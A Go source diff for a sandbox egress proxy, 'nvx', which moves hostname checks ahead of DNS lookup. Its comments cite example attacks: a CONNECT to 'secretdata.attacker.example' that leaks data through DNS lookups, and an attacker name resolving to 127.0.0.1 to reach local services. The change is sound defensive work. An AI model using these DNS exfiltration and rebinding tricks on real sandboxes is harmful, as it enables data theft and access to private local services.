@@ -346,14 +346,28 @@ func egressAllowHostRemedy(key string) string {
 		". Adding one counts as loosening, so a project .nvx-policy.json naming it needs approval, and ~/.nvx/policy.json does not.", key, key)
 }
 
-func (p *EgressProxy) allowed(hp hostPort, ips []net.IP) bool {
+// admit decides whether the client may reach hp, and returns the addresses to
+// dial when it may.
+//
+// The NAME is judged first and resolve runs only for a name that is already
+// allowed: by the policy, by an earlier grant in this run, or by the person at
+// the prompt. The handlers used to resolve before asking, so a contained
+// process could send data out in the names it asked for. CONNECT
+// secretdata.attacker.example:443 made nvx look the name up on the host's
+// network and then answer 403. The sandboxes block a contained process's own
+// DNS on every platform, which left this proxy as the way out.
+//
+// resolve is resolveEgressTarget in the handlers. It is called at most once,
+// and the addresses it returns are the ones judged and dialled.
+func (p *EgressProxy) admit(hp hostPort, resolve func(string) ([]net.IP, error)) ([]net.IP, bool) {
 	// Before anything else: is this a name at all? Everything below prints
 	// hp.host to a terminal or writes it to the audit log, and it is whatever
 	// bytes the sandboxed client put in its request. See validEgressHost.
 	if p.refuseInvalidHost(hp) {
-		return false
+		return nil, false
 	}
 	mode := strings.ToLower(strings.TrimSpace(p.policy.Isolation.Network.Mode))
+	key := fmt.Sprintf("%s:%d", hp.host, hp.port)
 
 	// A loopback destination used to be permitted unconditionally, whatever the
 	// policy said (F38). That was survivable only while the contained process had
@@ -373,7 +387,7 @@ func (p *EgressProxy) allowed(hp hostPort, ips []net.IP) bool {
 	// via allow_hosts"). network.mode "loopback" is the exception, because
 	// permitting exactly these is the entire definition of that mode.
 	if isLoopback(hp.host) && mode == "loopback" {
-		return true
+		return p.resolveAdmitted(hp, key, resolve)
 	}
 	// offline is no network at all, as README.md defines it, and that includes
 	// hosts the allowlist names. The allowlist was consulted before this check,
@@ -383,23 +397,21 @@ func (p *EgressProxy) allowed(hp hostPort, ips []net.IP) bool {
 	// process and registry.npmjs.org. Refused here first, and the socket is no
 	// longer offered in offline mode (prepareEgressSocket).
 	if mode == "offline" {
-		key := fmt.Sprintf("%s:%d", hp.host, hp.port)
 		LogWarn("Blocked egress (network.mode=%s): %s", mode, key)
 		auditLog(p.nvxHome, "egress_block_mode", map[string]string{"host": key, "mode": mode})
-		return false
+		return nil, false
 	}
 
 	keys := allowKeysFor(hp)
 	for _, k := range keys {
 		if p.allow[k] {
-			return true
+			return p.resolveAdmitted(hp, key, resolve)
 		}
 	}
-	key := fmt.Sprintf("%s:%d", hp.host, hp.port)
-	if mode == "offline" || mode == "loopback" {
+	if mode == "loopback" {
 		LogWarn("Blocked egress (network.mode=%s): %s", mode, key)
 		auditLog(p.nvxHome, "egress_block_mode", map[string]string{"host": key, "mode": mode})
-		return false
+		return nil, false
 	}
 
 	// A loopback destination is never grantable by prompt -- only by policy file.
@@ -417,44 +429,78 @@ func (p *EgressProxy) allowed(hp hostPort, ips []net.IP) bool {
 	// Postgres, Redis, dev servers, other agents' MCP servers. An allowlist entry
 	// someone typed into a policy file is a decision that can be read and diffed;
 	// an answer to a prompt raised by untrusted code is not.
-	// The NAME and the ADDRESS, because a name is exactly how you reach 127.0.0.1
-	// without typing it. isLoopback matches only the literal spellings, so
-	// `cache.attacker.example` with an A record of 127.0.0.1 walked past this
-	// refusal and reached the prompt -- and one "yes" from a developer who was
-	// not expecting a security question hands a postinstall their local Postgres,
-	// which is the outcome the paragraph above says this exists to prevent.
-	// Found by an independent acceptance pass on 2026-09-03.
 	//
-	// This sits BEFORE the session check, and that placement is load-bearing. A
-	// grant given while a name resolved publicly is keyed on the name, so with the
-	// check after it a later request -- same name, record now 127.0.0.1 -- matched
-	// the grant and was dialled without the address ever being looked at. The
-	// address has to be judged on every request, not only the one that prompted.
-	if isLoopback(hp.host) || anyLoopback(ips) {
-		LogWarn("Blocked egress to a local service: %s", key)
-		LogInfo("nvx does not offer local services through a prompt, because the contained process is what triggers it. "+
-			"If this is meant, add %q to isolation.network.allow_hosts in the project policy, or use --connect for one run.", key)
-		auditLog(p.nvxHome, "egress_deny_loopback_prompt", map[string]string{"host": key})
-		return false
+	// The literal spellings are refused here, before asking. A NAME that
+	// resolves to loopback is refused below, once it has been approved and
+	// looked up.
+	if isLoopback(hp.host) {
+		p.refuseLoopbackGrant(key)
+		return nil, false
 	}
-	// A name that did not resolve is not offered at the prompt either. A person
-	// cannot judge an address nobody has seen -- and the dial's own second lookup
-	// cannot tell a prompt-approved name from an allowlisted one, so it applies
-	// only the link-local check. SERVFAIL to the first query and 127.0.0.1 to the
-	// second therefore walked through the loopback refusal above and reached the
-	// prompt: the same shape closed for link-local the day before, found by an
-	// independent audit on 2026-09-06. Allowlisted names are not affected; they
+
+	if !p.sessionAllows(keys) && !p.askUnknownHost(key) {
+		return nil, false
+	}
+
+	// Approved by a person, by name, so the name may now be looked up. The
+	// address is judged on every request, and a grant does not skip it.
+	ips, ok := p.resolveAdmitted(hp, key, resolve)
+	if !ok {
+		return nil, false
+	}
+	// The ADDRESS as well as the name, because a name is exactly how you reach
+	// 127.0.0.1 without typing it. `cache.attacker.example` with an A record of
+	// 127.0.0.1 walked past the literal check above and was granted at the
+	// prompt. Found by an independent acceptance pass on 2026-09-03.
+	//
+	// Judged on every request, after the session grant as well as after the
+	// prompt. A grant given while a name resolved publicly is keyed on the name,
+	// so a later request for the same name, its record now 127.0.0.1, would
+	// otherwise be dialled without the address ever being looked at.
+	if anyLoopback(ips) {
+		p.refuseLoopbackGrant(key)
+		return nil, false
+	}
+	// A name that did not resolve is not dialled on a person's grant either. The
+	// dial's own second lookup cannot tell a prompt-approved name from an
+	// allowlisted one, so it applies only the link-local check. SERVFAIL to this
+	// lookup and 127.0.0.1 to the dial's therefore walked through the loopback
+	// refusal above: the same shape closed for link-local the day before, found by
+	// an independent audit on 2026-09-06. Allowlisted names are not affected; they
 	// returned above, and a transient DNS failure there stays the dial's problem.
 	if len(ips) == 0 {
-		LogWarn("Blocked egress: %s did not resolve, and nvx does not ask you to approve an address it has not seen.", key)
+		LogWarn("Blocked egress: %s did not resolve, and nvx does not dial an approved name whose address it has not seen.", key)
 		auditLog(p.nvxHome, "egress_deny_unresolved_prompt", map[string]string{"host": key})
-		return false
+		return nil, false
 	}
+	return ips, true
+}
 
-	if p.sessionAllows(keys) {
-		return true
+// resolveAdmitted resolves a name admit has allowed, once, and refuses it when
+// the answer is link-local. See resolveEgressAddresses.
+func (p *EgressProxy) resolveAdmitted(hp hostPort, key string, resolve func(string) ([]net.IP, error)) ([]net.IP, bool) {
+	ips, err := resolve(hp.host)
+	if err != nil {
+		LogWarn("Blocked egress: %v", err)
+		auditLog(p.nvxHome, "egress_deny_resolved", map[string]string{"host": key})
+		return nil, false
 	}
+	return ips, true
+}
 
+// refuseLoopbackGrant reports a local service refused on the prompt path. See
+// the loopback refusal in admit.
+func (p *EgressProxy) refuseLoopbackGrant(key string) {
+	LogWarn("Blocked egress to a local service: %s", key)
+	LogInfo("nvx does not offer local services through a prompt, because the contained process is what triggers it. "+
+		"If this is meant, add %q to isolation.network.allow_hosts in the project policy, or use --connect for one run.", key)
+	auditLog(p.nvxHome, "egress_deny_loopback_prompt", map[string]string{"host": key})
+}
+
+// askUnknownHost asks once per run whether key may be reached, and reports the
+// answer. The question names the host and port only, and nothing has been
+// looked up when it is asked.
+func (p *EgressProxy) askUnknownHost(key string) bool {
 	if !p.policy.Isolation.Network.PromptUnknown {
 		LogWarn("Blocked egress: %s", key)
 		p.explainHowToAllowOnce(key)
@@ -618,16 +664,11 @@ func (p *EgressProxy) handleHTTPConn(client net.Conn) {
 		// The raw request target came from the sandboxed process and could carry
 		// terminal escapes in its port part.
 		target := net.JoinHostPort(hp.host, strconv.Itoa(int(hp.port)))
-		// Resolved ONCE, here, and everything below judges and dials that same
-		// answer. See resolveEgressAddresses for what resolving twice cost.
-		ips, rerr := resolveEgressTarget(hp.host)
-		if rerr != nil {
-			LogWarn("Blocked egress: %v", rerr)
-			auditLog(p.nvxHome, "egress_deny_resolved", map[string]string{"host": target})
-			_, _ = fmt.Fprintf(client, "HTTP/1.1 403 Forbidden\r\n\r\n")
-			return
-		}
-		if !p.allowed(hp, ips) {
+		// The name is judged before it is looked up, and an allowed name is
+		// resolved ONCE, inside admit. Everything below dials that same answer.
+		// See resolveEgressAddresses for what resolving twice cost.
+		ips, ok := p.admit(hp, resolveEgressTarget)
+		if !ok {
 			_, _ = fmt.Fprintf(client, "HTTP/1.1 403 Forbidden\r\n\r\n")
 			return
 		}
@@ -815,15 +856,9 @@ func (p *EgressProxy) handleSOCKSConn(conn net.Conn) {
 		_, _ = conn.Write([]byte{0x05, 0x02, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
 		return
 	}
-	// Resolved once; see the CONNECT path above and resolveEgressAddresses.
-	ips, rerr := resolveEgressTarget(hp.host)
-	if rerr != nil {
-		LogWarn("Blocked egress: %v", rerr)
-		auditLog(p.nvxHome, "egress_deny_resolved", map[string]string{"host": host})
-		_, _ = conn.Write([]byte{0x05, 0x02, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
-		return
-	}
-	if !p.allowed(hp, ips) {
+	// Judged by name, then resolved once if allowed. See the CONNECT path.
+	ips, ok := p.admit(hp, resolveEgressTarget)
+	if !ok {
 		_, _ = conn.Write([]byte{0x05, 0x02, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
 		return
 	}
